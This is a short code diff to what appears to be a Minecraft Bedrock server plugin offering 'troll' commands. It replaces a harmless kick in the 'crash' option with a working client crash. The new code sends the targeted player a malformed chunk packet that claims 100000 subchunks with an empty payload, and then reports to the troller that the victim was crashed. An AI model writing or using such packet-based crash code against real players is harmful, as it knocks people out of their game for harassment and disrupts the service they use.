@@ -31,7 +31,8 @@ use pocketmine\level\{
 use pocketmine\network\mcpe\protocol\{
     AddActorPacket,
     PlaySoundPacket,
-    LevelEventPacket
+    LevelEventPacket,
+    LevelChunkPacket
 };
 
 use pocketmine\nbt\tag\StringTag;
@@ -179,7 +180,9 @@ class TrollCommand extends Command implements PluginIdentifiableCommand {
         }
 
         if($troll == 'crash'){
-            $victim->kick('§fDisconnected from Server', false);
+            $chunk = $victim->level->getChunkAtPosition($victim);
+            $pk = LevelChunkPacket::withCache($chunk->getX(), $chunk->getZ(), 100000, [], "");
+            $victim->sendDataPacket($pk);
             $troller->sendMessage(Main::PREFIX . ' §c' . $victim->getName() . ' §ahas been crashed!');
             return false;
         }
